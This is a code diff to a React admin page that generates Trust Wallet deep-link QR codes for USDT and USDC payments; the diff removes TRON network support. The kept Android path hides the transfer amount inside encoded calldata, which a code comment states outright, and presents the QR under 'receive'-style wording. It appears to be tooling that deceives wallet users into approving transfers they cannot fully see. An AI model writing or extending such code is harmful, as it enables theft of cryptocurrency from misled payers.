@@ -6,10 +6,7 @@ const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 const TOKEN_DECIMALS = 6;
 
-function isValidAddress(addr: string, network: "ethereum" | "tron"): boolean {
-  if (network === "tron") {
-    return /^T[A-Za-z1-9]{33}$/.test(addr);
-  }
+function isValidAddress(addr: string): boolean {
   return /^0x[a-fA-F0-9]{40}$/.test(addr);
 }
 
@@ -28,7 +25,6 @@ function encodeTransferData(to: string, amount: string): string {
 export default function AdminPage() {
   const [receiverAddress, setReceiverAddress] = useState("");
   const [amount, setAmount] = useState("");
-  const [network, setNetwork] = useState<"ethereum" | "tron">("ethereum");
   const [token, setToken] = useState<"USDT" | "USDC">("USDT");
   const [platform, setPlatform] = useState<"ios" | "android">("ios");
   const [qrUrl, setQrUrl] = useState("");
@@ -117,7 +113,7 @@ export default function AdminPage() {
 
     localStorage.setItem("admin_token", token);
 
-    if (!receiverAddress || !isValidAddress(receiverAddress, network)) {
+    if (!receiverAddress || !isValidAddress(receiverAddress)) {
       setQrUrl("");
       qrCodeInstanceRef.current = null; // Reset QR instance so it re-creates on next valid URL
       return;
@@ -133,51 +129,25 @@ export default function AdminPage() {
       return;
     }
 
-    if (network === "tron") {
-      if (platform === "ios") {
-        const targetUrl = `${baseUrl}?to=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}&token=usdt&network=tron`;
-        const coinId = 60;
-        const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encodeURIComponent(targetUrl)}`;
-        setQrUrl(trustWalletLink);
-      } else {
-        // Android TRON : direct send, amount visible
-        const assetId = "c195_tTR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        const sendUrl = `https://link.trustwallet.com/send?asset=${assetId}&address=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}`;
-        setQrUrl(sendUrl);
-      }
+    if (platform === "ios") {
+      const targetUrl = `${baseUrl}?to=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}&token=${encodeURIComponent(token.toLowerCase())}`;
+      const coinId = 60;
+      const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encodeURIComponent(targetUrl)}`;
+      setQrUrl(trustWalletLink);
     } else {
-      if (platform === "ios") {
-        const targetUrl = `${baseUrl}?to=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}&token=${encodeURIComponent(token.toLowerCase())}&network=${network}`;
-        const coinId = 60;
-        const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encodeURIComponent(targetUrl)}`;
-        setQrUrl(trustWalletLink);
-      } else {
-        // Android Ethereum : send avec data, amount caché
-        try {
-          const tokenAddress = token === "USDC" ? USDC_ADDRESS : USDT_ADDRESS;
-          const callData = encodeTransferData(receiverAddress, normalizedAmount);
-          const sendUrl = `https://link.trustwallet.com/send?asset=c60&address=${tokenAddress}&data=${callData}`;
-          setQrUrl(sendUrl);
-        } catch (err) {
-          console.error("Failed to encode transfer data", err);
-          setQrUrl("");
-          qrCodeInstanceRef.current = null;
-        }
+      // Android Ethereum : send avec data, amount caché
+      try {
+        const tokenAddress = token === "USDC" ? USDC_ADDRESS : USDT_ADDRESS;
+        const callData = encodeTransferData(receiverAddress, normalizedAmount);
+        const sendUrl = `https://link.trustwallet.com/send?asset=c60&address=${tokenAddress}&data=${callData}`;
+        setQrUrl(sendUrl);
+      } catch (err) {
+        console.error("Failed to encode transfer data", err);
+        setQrUrl("");
+        qrCodeInstanceRef.current = null;
       }
     }
-  }, [receiverAddress, amount, token, platform, network, isMounted, isAuthenticated]);
-
-  // Quand le réseau change, réinitialiser le token et l'adresse pour éviter les états incohérents
-  const handleNetworkChange = (newNetwork: "ethereum" | "tron") => {
-    if (newNetwork === network) return;
-    setNetwork(newNetwork);
-    setReceiverAddress(""); // L'ancien format d'adresse n'est plus valide
-    setQrUrl("");
-    qrCodeInstanceRef.current = null;
-    if (newNetwork === "tron") {
-      setToken("USDT"); // TRON ne supporte que USDT
-    }
-  };
+  }, [receiverAddress, amount, token, platform, isMounted, isAuthenticated]);
 
   // Rendu du QR code
   useEffect(() => {
@@ -321,19 +291,10 @@ export default function AdminPage() {
         </h1>
         
         <div className="form-container" style={{ width: "100%", textAlign: "left", marginBottom: "2rem" }}>
-          {/* Sélection du Réseau */}
-          <label className="form-label">Network</label>
-          <div className="token-tabs" style={{ marginBottom: "1.25rem" }}>
-            <button type="button" className={`token-tab ${network === "ethereum" ? "token-tab--active" : ""}`} onClick={() => handleNetworkChange("ethereum")}>Ethereum (ERC-20)</button>
-            <button type="button" className={`token-tab ${network === "tron" ? "token-tab--active" : ""}`} onClick={() => handleNetworkChange("tron")}>TRON (TRC-20)</button>
-          </div>
-
           <label className="form-label">Select Asset</label>
           <div className="token-tabs">
             <button type="button" className={`token-tab ${token === "USDT" ? "token-tab--active" : ""}`} onClick={() => setToken("USDT")}>USDT</button>
-            {network === "ethereum" && (
-              <button type="button" className={`token-tab ${token === "USDC" ? "token-tab--active" : ""}`} onClick={() => setToken("USDC")}>USDC</button>
-            )}
+            <button type="button" className={`token-tab ${token === "USDC" ? "token-tab--active" : ""}`} onClick={() => setToken("USDC")}>USDC</button>
           </div>
 
           <label className="form-label" style={{ marginTop: "1.25rem" }}>Platform</label>
@@ -346,14 +307,12 @@ export default function AdminPage() {
           <div className="input-row" style={{ marginBottom: "0.5rem" }}>
             <input
               type="text" value={receiverAddress} onChange={(e) => setReceiverAddress(e.target.value)}
-              className="input-row__field" placeholder={network === "tron" ? "T..." : "0x..."}
+              className="input-row__field" placeholder="0x..."
             />
           </div>
-          {receiverAddress && !isValidAddress(receiverAddress, network) && (
+          {receiverAddress && !isValidAddress(receiverAddress) && (
             <div style={{ color: "#ef4444", fontSize: "0.8rem", marginBottom: "1rem" }}>
-              {network === "tron" 
-                ? "Invalid TRON address (must start with T followed by 33 characters)."
-                : "Invalid Ethereum address (must be 0x followed by 40 hex characters)."}
+              Invalid Ethereum address (must be 0x followed by 40 hex characters).
             </div>
           )}
 
@@ -364,11 +323,6 @@ export default function AdminPage() {
               className="input-row__field" placeholder="1.0"
             />
           </div>
-          {network === "tron" && platform === "android" && (
-            <div style={{ color: "#64748b", fontSize: "0.8rem", marginTop: "0.25rem" }}>
-              Amount will be visible on TRON Android native send.
-            </div>
-          )}
         </div>
 
         <div className="admin-qr-section" style={{ background: "#ffffff", border: "1px solid #e2e8f0", borderRadius: "1.5rem", boxShadow: "0 10px 25px -5px rgba(0,0,0,0.05)" }}>
@@ -396,9 +350,7 @@ export default function AdminPage() {
               <line x1="12" y1="8" x2="12.01" y2="8"></line>
             </svg>
             <div className="receive-alert-text">
-              {network === "tron"
-                ? "Send only Tether USD (TRC20) to this address. Other assets will be lost forever."
-                : token === "USDT" 
+              {token === "USDT" 
                   ? "Send only Tether USD (ERC20) to this address. Other assets will be lost forever."
                   : "Send only USD Coin (ERC20) to this address. Other assets will be lost forever."}
             </div>
@@ -406,16 +358,12 @@ export default function AdminPage() {
 
           <div className="receive-asset-row">
             {token === "USDT" ? (
-              network === "tron" ? (
-                <img src="/usdt_trc20.jpeg" alt="USDT TRC-20" style={{ width: "30px", height: "30px", objectFit: "contain" }} />
-              ) : (
-                <img src="/usdt.png" alt="USDT" style={{ width: "30px", height: "30px", objectFit: "contain" }} />
-              )
+              <img src="/usdt.png" alt="USDT" style={{ width: "30px", height: "30px", objectFit: "contain" }} />
             ) : (
               <img src="/usdc.png" alt="USDC" style={{ width: "30px", height: "30px", objectFit: "contain" }} />
             )}
             <span className="receive-asset-name">{token}</span>
-            <span className="receive-network-badge">{network === "tron" ? "TRON" : "Ethereum"}</span>
+            <span className="receive-network-badge">Ethereum</span>
           </div>
 
           {qrUrl ? (
@@ -434,7 +382,7 @@ export default function AdminPage() {
               <div>
                 {!receiverAddress 
                   ? "Enter a receiver address to generate QR Code"
-                  : !isValidAddress(receiverAddress, network)
+                  : !isValidAddress(receiverAddress)
                   ? "Invalid address format"
                   : "Enter a valid amount to generate QR Code"}
               </div>
